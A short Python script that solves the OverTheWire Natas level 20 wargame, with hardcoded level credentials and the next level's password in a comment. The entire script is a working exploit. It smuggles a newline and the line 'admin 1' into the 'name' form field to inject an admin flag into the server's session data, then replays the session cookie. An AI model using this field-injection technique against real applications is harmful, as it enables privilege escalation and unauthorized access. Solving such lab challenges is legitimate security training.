import requests
from requests.auth import HTTPBasicAuth

auth = ('natas20', 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF')
Data = {'name' : 'bhalu\nadmin 1'}
sessid = "hello"

for i in range(0, 2):
	cookies = dict(PHPSESSID=sessid)
	r = requests.post('http://natas20.natas.labs.overthewire.org/index.php', auth=auth, data=Data, cookies=cookies)
	print(r.text)

#passwd = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'